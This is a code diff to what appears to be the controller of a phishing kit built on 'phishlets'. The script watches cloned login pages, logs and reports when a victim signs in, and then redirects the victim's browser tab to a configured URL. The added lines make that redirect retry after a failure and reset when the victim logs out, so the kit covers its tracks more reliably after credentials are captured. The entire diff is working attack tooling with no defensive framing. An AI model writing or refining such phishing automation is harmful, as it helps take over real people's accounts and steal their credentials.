@@ -317,6 +317,7 @@ def main():
 
     last_url = {}
     last_logged_in = {}
+    redirected = {}  # tracks if we've successfully redirected each phishlet
     started = time.time()
 
     while True:
@@ -341,12 +342,23 @@ def main():
             if logged_in and not prev_logged_in:
                 log(f"[{phishlet_key}] LOGIN detected at {url}")
                 send_visit(phishlet_key, url)
+                redirected[phishlet_key] = False
+
+            if not logged_in and prev_logged_in:
+                redirected[phishlet_key] = False  # reset redirect state on logout
+
+            if logged_in and not redirected.get(phishlet_key, False):
                 target = get_redirect_url(phishlet_key)
                 if target:
-                    log(f"[{phishlet_key}] redirected current tab to {target}")
-                    navigate(target)
+                    success = navigate(target)
+                    if success:
+                        log(f"[{phishlet_key}] redirected current tab to {target}")
+                        redirected[phishlet_key] = True
+                    else:
+                        log(f"[{phishlet_key}] redirect failed (will retry)")
                 else:
                     log(f"[{phishlet_key}] no redirect URL configured")
+                    redirected[phishlet_key] = True  # don't retry if no URL configured
 
             last_logged_in[phishlet_key] = logged_in
         else:
